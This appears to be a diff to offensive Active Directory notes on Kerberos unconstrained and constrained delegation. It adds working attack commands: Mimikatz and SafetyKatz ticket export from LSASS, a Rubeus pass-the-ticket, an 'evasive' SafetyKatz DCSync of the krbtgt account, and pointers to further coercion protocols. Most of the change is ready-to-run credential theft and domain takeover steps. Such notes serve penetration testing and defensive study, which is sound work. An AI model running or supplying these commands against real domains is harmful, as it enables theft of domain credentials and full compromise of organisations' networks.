@@ -30,7 +30,7 @@ Get-ADUser -Filter {TrustedForDelegation -eq $True}
 It is possible to extract the TGTs from the service's LSASS process using `Mimikatz` and perform pass the ticket.
 
 ```powershell
-# Extract the TGT
+# Extract the TGT. Same cane be done in SafetyKatz too
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
 # Pass the ticket
@@ -54,16 +54,18 @@ Rubeus.exe monitor /interval:5 /nowrap
 MS-RPRN.exe \\dc.machine.local \\compromised.machine.local
 ```
 
-3. Pass The Ticket
-4. DC Sync
+3. Pass The Ticket `Rubeus.exe ptt /ticket:<ticket>`
+4. DC Sync `SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`
+
+Check for **Windows Search(MS-WSP)**\[Default: Server-No, Client-Yes] and **DFS Namespaces(MS-DFSNM\[MDI-detectable])**\[Default:No] too.
 
 ## Constrained Delegation
 
 Constrained Delegation allowing **specified** services on **specified** computers to use a user TGT in order to communicate with the **any** other service.
 
-in order to create a more restrictive delegation mechanism, Microsoft develop two Kerberos extensions known as  Service for user (S4U):
+in order to create a more restrictive delegation mechanism, Microsoft develop two Kerberos extensions known as Service for user (S4U):
 
-* Service for User to Self  (S4U2self) - allows a service to obtain forwardable TGS to itself on behalf of user.
+* Service for User to Self (S4U2self) - allows a service to obtain forwardable TGS to itself on behalf of user.
 * Service for User to Proxy (S4U2proxy) - allows a service to obtain a TGS to another service on behalf of user.\
   Note that the other services are from white list controlled by `msDS-AllowedToDelegateTo` attribute.
 
@@ -100,6 +102,8 @@ Check if worked
 ```powershell
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
 ```
+
+Or dcsync if you have changed the service to LDAP.
 
 ## Resource Based Delegation
 
